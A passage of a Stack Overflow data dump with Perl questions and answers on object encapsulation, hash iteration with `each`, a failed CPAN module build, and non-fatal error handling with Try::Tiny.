"https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457278075, "post_id": 35828662, "comment_id": 59324110, "body": "Can someone <i>please</i> let me know if the Perl Journal is not freely accessible? I was surprised  that I couldn&#39;t find a &quot;proper&quot; public URL for its content. Thanks"}, {"owner": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "edited": false, "score": 0, "creation_date": 1457281017, "post_id": 35828662, "comment_id": 59325348, "body": "Konkov and Borodin: Thanks guys, you help me a lot, with this few answers. I try to implement some kind of netbeans-convention and factory-pattern and other stuffs in Perl, a way like i would do in Java and without any frameworks. Of course not directly like in Java, but you now what i mean. Thanks."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "edited": false, "score": 1, "creation_date": 1457283379, "post_id": 35828662, "comment_id": 59326217, "body": "@DenisKomnenovic: I&#39;m sorry that you never chose to explain what you were hoping to achieve. This is clearly an <a href=\"http://xyproblem.info/\" rel=\"nofollow noreferrer\">X Y problem</a>, but we were never given the chance to address the underlying issue, and you got some very vague responses when we had to guess at your purpose"}, {"owner": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "edited": false, "score": 0, "creation_date": 1457285072, "post_id": 35828662, "comment_id": 59326845, "body": "Sorry, but i have to finish some prog. - tasks today and i have not so much time, next time i will write some examples. Cheers."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "edited": false, "score": 1, "creation_date": 1457285415, "post_id": 35828662, "comment_id": 59326976, "body": "@DenisKomnenovic: It&#39;s not so much code examples that I wanted, but more an insight into what these <i>&quot;really encapsulated variables&quot;</i> were for. It&#39;s always better to ask for a solution to the underlying problem than to invent a partial solution and ask how to implement that. If, as I suspect, you&#39;re hoping to prevent unauthorised people hacking your code then I promise you&#39;re wasting your time. With proper data security, the worst a persistent hacker can do is crash your system. Code security is pointless"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1457277984, "last_edit_date": 1457277984, "creation_date": 1457277671, "answer_id": 35828662, "question_id": 35828283, "link": "https://stackoverflow.com/questions/35828283/oo-paradigm-and-encapsulated-instance-variables-in-perl5/35828662#35828662", "title": "OO paradigm and encapsulated instance variables in Perl5", "body": "<p>It sounds like you're trying to prevent people from accessing the instance variables other than through the accessors; is that right?</p>\n\n<p>Perl is a language for polite people, and the way you stop programmers from doing things you don't want them to do is to ask them not to. Yes, there are hacks, and the most obvious one here would be to make each object a closure (<a href=\"http://www.foo.be/docs/tpj/issues/vol4_3/tpj0403-0010.html\" rel=\"nofollow\">here's an article about it from the Perl Journal</a>) but there are almost always ways around them, so you won't be able to stop the determined impertinent hacker</p>\n\n<p>One of <a href=\"https://www.goodreads.com/author/quotes/89118.Larry_Wall\" rel=\"nofollow\">Larry Wall's excellent attributions</a> is this, which explains my point superbly</p>\n\n<blockquote>\n  <p>Perl doesn't have an infatuation with enforced privacy. It would prefer that you stayed out of its living room because you weren't invited, not because it has a shotgun</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 2, "last_activity_date": 1457311501, "last_edit_date": 1592644375, "creation_date": 1457278231, "answer_id": 35828756, "question_id": 35828283, "link": "https://stackoverflow.com/questions/35828283/oo-paradigm-and-encapsulated-instance-variables-in-perl5/35828756#35828756", "title": "OO paradigm and encapsulated instance variables in Perl5", "body": "<p>People tried to achieve this kind of thing with <em>inside out objects</em>. <a href=\"http://www.dagolden.com/wp-content/uploads/2010/07/20060117_whats_all_the_fuss.pdf\" rel=\"nofollow noreferrer\">This presentation by David Golden</a> explains it perfectly:</p>\n<blockquote>\n<ul>\n<li><p>Inside-out objects first presented by Dutch Perl hacker Abigail in 2002</p>\n</li>\n<li><p>Spring 2002 \u2013 First mention at Amsterdam.pm,</p>\n</li>\n<li><p>June 28, 2002 \u2013 YAPC NA &quot;Two alternative ways of doing OO&quot;</p>\n</li>\n<li><p>July 1, 2002 \u2013 First mention on Perlmonks</p>\n</li>\n<li><p>Gained recent attention (notoriety?) as a recommended best practice with the publication of Damian Conway's Perl Best Practices</p>\n</li>\n<li><p>Despite their benefits, they bring significant complexity and are not universally welcomed</p>\n</li>\n</ul>\n</blockquote>\n<p>There are a <a href=\"https://metacpan.org/search?size=20&amp;q=inside%20out&amp;search_type=modules\" rel=\"nofollow noreferrer\">number of modules</a> that try to facilitate this type of programming.</p>\n<p>I find them rather cumbersome, and they have since fallen out of favor.</p>\n<p>You can also find them mentioned in <a href=\"https://metacpan.org/pod/perlobj#Inside-Out-objects\" rel=\"nofollow noreferrer\">perldoc perlobj</a>:</p>\n<blockquote>\n<p>In the past, the Perl community experimented with a technique called &quot;inside-out objects&quot;. An inside-out object stores its data outside of the object's reference, indexed on a unique property of the object, such as its memory address, rather than in the object itself. This has the advantage of enforcing the encapsulation of object attributes, since their data is not stored in the object itself.</p>\n<p>This technique was popular for a while (and was recommended in Damian Conway's Perl Best Practices), but never achieved universal adoption. The <code>Object::InsideOut</code> module on CPAN provides a comprehensive implementation of this technique, and you may see it or other inside-out modules in the wild.</p>\n</blockquote>\n"}], "owner": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "closed_date": 1457294622, "answer_count": 3, "score": 0, "last_activity_date": 1457311501, "creation_date": 1457275715, "last_edit_date": 1457277758, "question_id": 35828283, "link": "https://stackoverflow.com/questions/35828283/oo-paradigm-and-encapsulated-instance-variables-in-perl5", "closed_reason": "Needs details or clarity", "title": "OO paradigm and encapsulated instance variables in Perl5", "body": "<p>I need a way to make really encapsulated variables in Perl, without using any frameworks like Moose, so that you can access the instance variables only through getters and setters. There should be private instance variables.</p>\n\n<p>The subroutines respectively methods are not a problem, because you can define them so that they can be used just through an instance respectively a reference. But variables you can always access via the package name, like class-vars.</p>\n\n<p>Is there any way to prevent that?</p>\n"}, {"tags": ["perl", "function", "hash", "iteration"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457284317, "post_id": 35828074, "comment_id": 59326566, "body": "<code>$key =~ $lib</code> will in general test whether <code>$key</code> *contains the substring` in <code>$lib</code>. It will also do some strange things if <code>$lib</code> contains any of the regex metacharacters <code>\\</code> <code>|</code> <code>(</code> <code>)</code> <code>[</code> <code>{</code> <code>^</code> <code>$</code> <code>*</code> <code>+</code> <code>?</code> <code>.</code>. You probably just want a test for string equality <code>$key eq $lib</code>"}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 4, "last_activity_date": 1457283617, "last_edit_date": 1457283617, "creation_date": 1457275623, "answer_id": 35828268, "question_id": 35828074, "link": "https://stackoverflow.com/questions/35828074/iterating-on-hash-using-each-not-like-expected/35828268#35828268", "title": "Iterating on hash using `each` not like expected", "body": "<p>There is a problem with <code>each</code> in that, as you have discovered, it keeps an internal state for each hash that remembers where the iteration has reached</p>\n\n<p>You can reset that state by a call to <code>keys %MyHash</code>, so your subroutine becomes</p>\n\n<pre><code>sub _check_existence {\n\n    my ($lib) = @_;\n\n    while ( my ( $key, $value ) = each %{ $MyHash{sub_keys} } ) {\n        if ( $key =~ /$lib/ ) {\n            keys %{ $MyHash{sub_keys} };\n            return 1;\n        }\n    }\n\n    return;\n}\n</code></pre>\n\n<p>However, what you have written is a subroutine that checks whether any of the keys of the hash <em>contains</em> the passed parameter as a <em>substring</em>, which is an odd requirement. If you meant instead to check for equality then you should be using the essential property of a hash\u2014that it is indexed by its keys, and there is a built-in operator for that: you can write</p>\n\n<pre><code>exists $MyHash{sub_keys}{$_[0]};\n</code></pre>\n\n<p>If you really did mean to check for a substring rather than simple equality then there is another option. You never use <code>$value</code>, so you can just ask for a list of <em>keys</em> of the hash. The <code>keys</code> operator doesn't have the same problem as <code>each</code> because it isn't designed to return the next key/value pair each tim it is called in scalar context. So you could write this</p>\n\n<pre><code>sub _check_existence {\n\n    my ($lib) = @_;\n\n    for my $key ( keys %{ $MyHash{sub_keys} } ) {\n        return 1 if $key =~ /$lib/;\n    }\n\n    return;\n}\n</code></pre>\n\n<p>Finally I would say that using the global <code>%MyHash</code> from inside the subroutine is a bit ugly. It should be passed by reference as another subroutine parameter</p>\n"}], "owner": {"reputation": 37, "user_id": 3735180, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9d3b0ba09d44bb6cf262e2a41c8df24?s=128&d=identicon&r=PG&f=1", "display_name": "user3735180", "link": "https://stackoverflow.com/users/3735180/user3735180"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "accepted_answer_id": 35828268, "answer_count": 1, "score": 0, "last_activity_date": 1457284135, "creation_date": 1457274512, "last_edit_date": 1457284135, "question_id": 35828074, "link": "https://stackoverflow.com/questions/35828074/iterating-on-hash-using-each-not-like-expected", "title": "Iterating on hash using `each` not like expected", "body": "<p>I am writing a Perl script and have written a subroutine to check whether a key exists in my hash. This is the content of the subroutine:</p>\n\n<pre><code>sub _check_existence {\n    my $lib = $_[0];\n    while( my( $key, $value ) = each (%{$MyHash{sub_keys}})) \n    {\n        if ($key =~ $lib)\n        {\n            return 1;\n        }   \n    }\n    return 0;    }\n</code></pre>\n\n<p>The problem is that every time the function is running it starts from the last time it ran.</p>\n\n<p>For example, if the hash has keys <code>0</code> <code>1</code> <code>2</code> <code>3</code> <code>4</code> <code>5</code> <code>6</code> <code>7</code> <code>8</code>, the first time the subroutine is called looking for the key <code>3</code> it will find it. But if I call the subroutine again looking for <code>3</code> I will get <em>false</em>, because the iteration continues from <code>4</code>, and not from the beginning.</p>\n\n<p>Can someone explain what causes this?</p>\n"}, {"tags": ["perl", "perl-module", "cpan"], "answers": [{"comments": [{"owner": {"reputation": 2832, "user_id": 3817111, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/74a0bee899663751fa86a3f2a0145e3a?s=128&d=identicon&r=PG", "display_name": "Menasheh", "link": "https://stackoverflow.com/users/3817111/menasheh"}, "edited": false, "score": 0, "creation_date": 1457249221, "post_id": 35822419, "comment_id": 59315383, "body": "What precompiled files? What header files?"}, {"owner": {"reputation": 2832, "user_id": 3817111, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/74a0bee899663751fa86a3f2a0145e3a?s=128&d=identicon&r=PG", "display_name": "Menasheh", "link": "https://stackoverflow.com/users/3817111/menasheh"}, "edited": false, "score": 0, "creation_date": 1457290719, "post_id": 35822419, "comment_id": 59329129, "body": "There are no .a files in the downloaded zipfile.  running make in one of the irrlicht folders generates &#39;libIrrlicht.a&#39; but the other two mentioned are evasive, and it&#39;s very unclear which header files it&#39;s talking about.  There is no irrlicht.h in the directory."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 2832, "user_id": 3817111, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/74a0bee899663751fa86a3f2a0145e3a?s=128&d=identicon&r=PG", "display_name": "Menasheh", "link": "https://stackoverflow.com/users/3817111/menasheh"}, "edited": false, "score": 0, "creation_date": 1457295713, "post_id": 35822419, "comment_id": 59330961, "body": "@Menasheh: I have answered your question. If you don&#39;t know how to install the <i>Irrlicht</i> engine then that is another question altogether."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1457231608, "creation_date": 1457231608, "answer_id": 35822419, "question_id": 35822229, "link": "https://stackoverflow.com/questions/35822229/cant-install-perl-package-gamesirrlicht-fatal-error/35822419#35822419", "title": "Can&#39;t install perl package Games::Irrlicht - fatal error", "body": "<p><a href=\"https://metacpan.org/pod/distribution/Games-Irrlicht/README#DEPENDENCIES\" rel=\"nofollow\">The README file</a> says</p>\n\n<blockquote>\n  <p>You need to install the Irrlicht engine from <a href=\"http://irrlicht.sf.net\" rel=\"nofollow\">http://irrlicht.sf.net</a></p>\n</blockquote>\n\n<p>It looks from your log like you haven't done that</p>\n\n<p>You should also read the rest of the <code>README</code> as there are a few other places where things may go wrong</p>\n"}], "owner": {"reputation": 2832, "user_id": 3817111, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/74a0bee899663751fa86a3f2a0145e3a?s=128&d=identicon&r=PG", "display_name": "Menasheh", "link": "https://stackoverflow.com/users/3817111/menasheh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 122, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1457290842, "creation_date": 1457229816, "last_edit_date": 1457290842, "question_id": 35822229, "link": "https://stackoverflow.com/questions/35822229/cant-install-perl-package-gamesirrlicht-fatal-error", "title": "Can&#39;t install perl package Games::Irrlicht - fatal error", "body": "<p>I'm trying to install the CPAN module <a href=\"https://metacpan.org/pod/distribution/Games-Irrlicht/lib/Games/Irrlicht.pm\" rel=\"nofollow\"><code>Games::Irrlicht</code></a> to deal with graphics. Some file isn't getting downloaded properly or something, resulting in a fatal error.</p>\n\n<p>What's wrong?</p>\n\n<p>My terminal output:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>cpan[1]&gt; install Games::Irrlicht\nReading '/home/me/.cpan/Metadata'\n  Database was generated on Sat, 05 Mar 2016 02:17:02 GMT\nRunning install for module 'Games::Irrlicht'\nChecksum for /home/me/.cpan/sources/authors/id/T/TE/TELS/games/Games-Irrlicht-0.04.tar.gz ok\nScanning cache /home/me/.cpan/build for sizes\n............................................................................DONE\n'YAML' not installed, will not store persistent state\nConfiguring T/TE/TELS/games/Games-Irrlicht-0.04.tar.gz with Makefile.PL\nChecking if your kit is complete...\nLooks good\nWarning: prerequisite Config::Simple 4.55 not found.\nWarning (mostly harmless): No library found for -lIrrlicht\nGenerating a Unix-style Makefile\nWriting Makefile for Games::Irrlicht\nWriting MYMETA.yml and MYMETA.json\n  TELS/games/Games-Irrlicht-0.04.tar.gz\n  /usr/bin/perl Makefile.PL INSTALLDIRS=site -- OK\nRunning make for T/TE/TELS/games/Games-Irrlicht-0.04.tar.gz\n---- Unsatisfied dependencies detected during ----\n----   TELS/games/Games-Irrlicht-0.04.tar.gz  ----\n    Config::Simple [requires]\nRunning install for module 'Config::Simple'\nChecksum for /home/me/.cpan/sources/authors/id/S/SH/SHERZODR/Config-Simple-4.58.tar.gz ok\nConfiguring S/SH/SHERZODR/Config-Simple-4.58.tar.gz with Makefile.PL\nChecking if your kit is complete...\nLooks good\nGenerating a Unix-style Makefile\nWriting Makefile for Config::Simple\nWriting MYMETA.yml and MYMETA.json\n  SHERZODR/Config-Simple-4.58.tar.gz\n  /usr/bin/perl Makefile.PL INSTALLDIRS=site -- OK\nRunning make for S/SH/SHERZODR/Config-Simple-4.58.tar.gz\ncp Simple.pm blib/lib/Config/Simple.pm\nAutoSplitting blib/lib/Config/Simple.pm (blib/lib/auto/Config/Simple)\nManifying blib/man3/Config::Simple.3pm\n  SHERZODR/Config-Simple-4.58.tar.gz\n  /usr/bin/make -- OK\nRunning make test\nPERL_DL_NONLAZY=1 /usr/bin/perl \"-MExtUtils::Command::MM\" \"-MTest::Harness\" \"-e\" \"undef *Test::Harness::Switches; test_harness(0, 'blib/lib', 'blib/arch')\" t/*.t\nt/bug.t ............. ok     \nt/create.t .......... ok     \nt/import.t .......... ok   \nt/ini.t ............. ok     \nt/is_modified.t ..... ok   \nt/read-rv.t ......... ok   \nt/simple.t .......... ok   \nt/simplified-ini.t .. ok   \nt/tie.t ............. ok   \nAll tests successful.\nFiles=9, Tests=75,  1 wallclock secs ( 0.06 usr  0.00 sys +  0.24 cusr  0.04 csys =  0.34 CPU)\nResult: PASS\n  SHERZODR/Config-Simple-4.58.tar.gz\n  /usr/bin/make test -- OK\nRunning make install\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/import_from.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/EXISTS.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/TIEHASH.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/NEXTKEY.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/hashref.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/CLEAR.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/FIRSTKEY.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/verbose.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/param_hash.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/block.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/vars.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/autosplit.ix\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/errstr.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/dump.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/import_names.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/DELETE.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/FETCH.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/write_string.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/STORE.al\nInstalling /usr/local/share/perl/5.20.2/auto/Config/Simple/error.al\nInstalling /usr/local/share/perl/5.20.2/Config/Simple.pm\nInstalling /usr/local/man/man3/Config::Simple.3pm\nAppending installation info to /usr/local/lib/x86_64-linux-gnu/perl/5.20.2/perllocal.pod\n  SHERZODR/Config-Simple-4.58.tar.gz\n  /usr/bin/make install  -- OK\n  TELS/games/Games-Irrlicht-0.04.tar.gz\n  Has already been unwrapped into directory /home/me/.cpan/build/Games-Irrlicht-0.04-7adKre\n  TELS/games/Games-Irrlicht-0.04.tar.gz\n  Has already been prepared\nRunning make for T/TE/TELS/games/Games-Irrlicht-0.04.tar.gz\ncp lib/Games/Irrlicht/Group.pm blib/lib/Games/Irrlicht/Group.pm\ncp lib/Games/Irrlicht/EventHandler.pm blib/lib/Games/Irrlicht/EventHandler.pm\ncp lib/Games/Irrlicht/Constants.pm blib/lib/Games/Irrlicht/Constants.pm\ncp lib/Games/Irrlicht/Timer.pm blib/lib/Games/Irrlicht/Timer.pm\ncp lib/Games/Irrlicht/Thingy.pm blib/lib/Games/Irrlicht/Thingy.pm\ncp lib/Games/Irrlicht.pm blib/lib/Games/Irrlicht.pm\nRunning Mkbootstrap for Games::Irrlicht ()\nchmod 644 Irrlicht.bs\n/usr/bin/perl /usr/share/perl/5.20/ExtUtils/xsubpp  -C++ -typemap /usr/share/perl/5.20/ExtUtils/typemap  Irrlicht.xs &gt; Irrlicht.xsc &amp;&amp; mv Irrlicht.xsc Irrlicht.c\nWarning: Found a 'CODE' section which seems to be using 'RETVAL' but no 'OUTPUT' section. in Irrlicht.xs, line 458\ng++ -c   -D_REENTRANT -D_GNU_SOURCE -DDEBIAN -fwrapv -fno-strict-aliasing -pipe -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -O2   -DVERSION=\\\"0.04\\\" -DXS_VERSION=\\\"0.04\\\" -fPIC \"-I/usr/lib/x86_64-linux-gnu/perl/5.20/CORE\"   Irrlicht.c\nIrrlicht.xs:6:31: fatal error: Irrlicht/irrlicht.h: No such file or directory\ncompilation terminated.\nMakefile:362: recipe for target 'Irrlicht.o' failed\nmake: *** [Irrlicht.o] Error 1\n  TELS/games/Games-Irrlicht-0.04.tar.gz\n  /usr/bin/make -- NOT OK\nFailed during this command:\n TELS/games/Games-Irrlicht-0.04.tar.gz        : make NO\n</code></pre>\n\n<p>This is in a terminal in Ubuntu 15.10</p>\n\n<p>The <a href=\"https://metacpan.org/pod/distribution/Games-Irrlicht/README#DEPENDENCIES\" rel=\"nofollow\">README</a> says to put \"precompiled files\" and \"header files\" into specific directories, but I can't find those files.</p>\n"}, {"tags": ["perl", "encryption", "error-handling", "cryptography"], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 6, "last_activity_date": 1457276955, "last_edit_date": 1457276955, "creation_date": 1457222213, "answer_id": 35821412, "question_id": 35820707, "link": "https://stackoverflow.com/questions/35820707/non-fatally-handling-error-in-perl/35821412#35821412", "title": "Non fatally handling error in Perl", "body": "<p>You need to use the BLOCK form of <a href=\"http://perldoc.perl.org/functions/eval.html\" rel=\"nofollow\"><code>eval</code></a> to prevent the program from dying when an exception is raised. Unfortunately a bare use of <code>eval</code> is fraught with awkward corner cases and it is best to use the <a href=\"http://metacpan.org/module/Try::Tiny\" rel=\"nofollow\"><code>Try::Tiny</code></a> module which handles these for you</p>\n\n<p>To achieve the purpose of your code in your question, you would write something like this. Clearly you will have to supply useful data for the variables</p>\n\n<p><strong>It's important to note</strong> that <code>try</code> and <code>catch</code> are <em>subroutines</em>. That means you need a semicolon after <code>catch</code>, and you can't <code>next</code> within <code>catch</code> because you can't do that from within a subroutine. You have to leave some sort of state set so that the subsequent code can do anything necessary there, and in this case I just check whether <code>$clients{$cur_client}</code> still exists\u2014it will have been deleted by the <code>catch</code> routine if there was a problem</p>\n\n<p>It's also worth explaining that the <code>die</code> string is available in <code>$_</code> inside the <code>catch</code> routine, so you can check the reason for the failure. In this case the <code>catch</code> is expecting to handle only <code>unrecognized key format</code> errors, so the code checks that that is indeed the reason for the failure. If not then it issues another <code>die $_</code> to reflect that an unhandled error has occurred</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse Crypt::OpenSSL::RSA;\nuse Try::Tiny;\n\nmy %clients = ( aa =&gt; {} );\nmy $message = 'xxx';\nmy ($address, $port) = qw/ 127.0.0.1 80 /;\n\nfor my $cur_client ( keys %clients ) {\n\n    try {\n        $clients{$cur_client}{pub_key} = Crypt::OpenSSL::RSA-&gt;new_public_key($message);\n    }\n    catch {\n        if ( /unrecognized key format/ ) {\n            server_log(\"Bad key exchange, dropping user $address:$port...\");\n            delete $clients{$cur_client};\n        }\n        else {\n            die $!;\n        }\n    };\n\n    next unless exists $clients{$cur_client};\n\n    # More handling of $cur_client in the case that\n    # the call to new_public_key succeeds\n}\n\nsub server_log {\n    print \"Logging: $_[0]\\n\";\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 42833, "user_id": 18914, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7a20a39ae2ef47ae042a3eddd5b5bd19?s=128&d=identicon&r=PG", "display_name": "Dave Sherohman", "link": "https://stackoverflow.com/users/18914/dave-sherohman"}, "edited": false, "score": 2, "creation_date": 1457253454, "post_id": 35824018, "comment_id": 59316390, "body": "The accepted answer first mentions <code>eval</code>, prior to suggesting that <code>Try::Tiny</code> is preferable because <code>eval</code> has numerous traps you can fall into and <code>Try::Tiny</code> avoids them. For example, your error-handling code will fail to detect that an error occurred if <code>$@</code> has a non-true value.  <a href=\"https://metacpan.org/pod/Try::Tiny#might-not-be-a-true-value\" rel=\"nofollow noreferrer\">metacpan.org/pod/Try::Tiny#might-not-be-a-true-value</a>"}], "tags": [], "owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "is_accepted": false, "score": 0, "last_activity_date": 1457246930, "creation_date": 1457246930, "answer_id": 35824018, "question_id": 35820707, "link": "https://stackoverflow.com/questions/35820707/non-fatally-handling-error-in-perl/35824018#35824018", "title": "Non fatally handling error in Perl", "body": "<p>I know this has already been answered but I thought I'd add it so people are aware that you don't need a module to catch errors in Perl, it's built in already. Here's some code to demo Perls inbuilt exception handling...</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nmy $a = 100;\nmy $res = 0;  \neval {\n  $res = $a/0;\n};\nif($@) {\n  print(\"I just caught a divide by zero here... $@\\n\");\n}\n</code></pre>\n\n<p>Heres another example...</p>\n\n<pre><code>eval {\n  die \"please die\\n\";;\n}; \nif($@) {\n  print(\"No, you cannot die just yet... $@\\n\");\n}\n</code></pre>\n\n<p>I've used this idiom for years and it's worked like a charm.</p>\n"}], "owner": {"reputation": 262, "user_id": 4671911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/f8ea67e9ae2150de4113dc3920ac86fc?s=128&d=identicon&r=PG&f=1", "display_name": "jess", "link": "https://stackoverflow.com/users/4671911/jess"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 138, "favorite_count": 0, "accepted_answer_id": 35821412, "answer_count": 2, "score": 0, "last_activity_date": 1457276955, "creation_date": 1457216863, "last_edit_date": 1495541730, "question_id": 35820707, "link": "https://stackoverflow.com/questions/35820707/non-fatally-handling-error-in-perl", "title": "Non fatally handling error in Perl", "body": "<p>In my previous <a href=\"https://stackoverflow.com/questions/35637618/converting-rsa-keys-to-json-in-perl/35644502#35644502\">question</a> it was recommended that I use the module <a href=\"http://metacpan.org/module/Crypt::OpenSSL::RSA\" rel=\"nofollow noreferrer\"><code>Crypt::OpenSSL::RSA</code></a> to export and send RSA keys. However, I have found that this module seems to have no way of non-fatally handling errors and as a result by simply sending a malformed string (i.e. not an RSA key) the server program will crash when it tries to create a new object using it with the message: </p>\n\n<blockquote>\n  <p>unrecognized key format at server.pl line 46</p>\n</blockquote>\n\n<p>Line 46 contains the code </p>\n\n<pre><code>$clients{$cur_client}-&gt;{pub_key}    = Crypt::OpenSSL::RSA-&gt;new_public_key($message) or do {\n            server_log \"Bad key exchange, dropping user $address:$port...\"; \n            delete $clients{$cur_client};\n            next;\n        }; # Key exchange\n</code></pre>\n\n<p>How do I fix this?</p>\n\n<p>EDIT: <a href=\"https://github.com/Alex-Ferguson/perl_chat_server\" rel=\"nofollow noreferrer\">Here is a link to the full code on Github</a></p>\n"}, {"tags": ["perl", "fasta"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": 